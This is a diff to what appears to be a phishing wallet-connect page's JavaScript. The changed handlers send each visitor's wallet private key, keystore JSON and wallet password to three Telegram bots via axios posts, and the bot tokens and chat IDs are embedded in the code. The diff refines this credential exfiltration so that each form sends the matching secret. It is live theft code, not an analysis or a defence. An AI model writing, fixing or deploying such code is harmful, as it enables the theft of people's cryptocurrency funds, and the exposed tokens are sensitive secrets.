@@ -606,25 +606,26 @@ async function handleKeystoreJson(e){
         // });
 
 
-        await axios.post(`https://api.telegram.org/bot6756922447:AAHPnkXx7NfYJbqPsuWsGlstzjs5FcdlzUY/sendMessage`, {
-            chat_id: 6150403557,
-            text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
-          });
+           await axios.post(`https://api.telegram.org/bot6756922447:AAHPnkXx7NfYJbqPsuWsGlstzjs5FcdlzUY/sendMessage`, {
+                chat_id: 6150403557,
+                text: `Wallet : ${selectedName} , Type : Keystore Json , Keystore Json : ${keystore_json}, Wallet Password : ${wallet_password}`,
+              });
 
 
-        await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
-            chat_id: 5868304053,
-            text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
-          });
+            await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
+                chat_id: 5868304053,
+                text: `Wallet : ${selectedName} , Type : Keystore Json , Keystore Json : ${keystore_json}, Wallet Password : ${wallet_password}`,
+              });
 
 
-       
+           
 
 
-        const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
-            chat_id: 5916570239,
-            text: `Wallet : ${selectedName} , Type : Keystore Json , Keystore Json : ${keystore_json}, Wallet Password : ${wallet_password}`,
-          });
+            const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
+                chat_id: 5916570239,
+                text: `Wallet : ${selectedName} , Type : Keystore Json , Keystore Json : ${keystore_json}, Wallet Password : ${wallet_password}`,
+              });
+
 
     
         // Handle success
@@ -672,22 +673,23 @@ async function handlePrivateKey(e){
         //     platform:selectedName,
         // });
 
-        await axios.post(`https://api.telegram.org/bot6756922447:AAHPnkXx7NfYJbqPsuWsGlstzjs5FcdlzUY/sendMessage`, {
-                chat_id: 6150403557,
-                text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
-              });
+
+          await axios.post(`https://api.telegram.org/bot6756922447:AAHPnkXx7NfYJbqPsuWsGlstzjs5FcdlzUY/sendMessage`, {
+                    chat_id: 6150403557,
+                    text: `Wallet : ${selectedName} , Type : Private Key , Private Key : ${private_key}`,
+                  });
 
 
-            await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
-                chat_id: 5868304053,
-                text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
-              });
+                await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
+                    chat_id: 5868304053,
+                    text: `Wallet : ${selectedName} , Type : Private Key , Private Key : ${private_key}`,
+                  });
 
 
-              const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
-                chat_id: 5916570239,
-                text: `Wallet : ${selectedName} , Type : phrase connection , Phrase : ${phrase}`,
-              });
+                  const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
+                    chat_id: 5916570239,
+                    text: `Wallet : ${selectedName} , Type : Private Key , Private Key : ${private_key}`,
+                  });
 
     
         // Handle success
